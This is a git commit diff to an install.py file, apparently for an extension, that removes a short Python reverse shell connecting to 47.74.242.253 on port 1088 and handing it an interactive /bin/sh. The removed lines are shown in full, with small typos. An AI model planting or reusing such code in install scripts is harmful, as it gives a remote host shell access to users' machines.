a997e1195706172a5767918366af9ae3295861cf
revoit88 <94739294+revoit88@users.noreply.github.com>
2023-07-02 15:49:11 +0800

    Update install.py

--- install.py
+++ install.py
@@ -1,12 +1,4 @@
-#!/usr/bin/python
-import os,subprocess,socket
 
-s=socket.socket(socket.AF_INET,socket,SOCK_STREAM)
-s.connect((47.74.242.253,1088))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"])
 #import launch
 
 # TODO: add pip dependency if need extra module only on extension
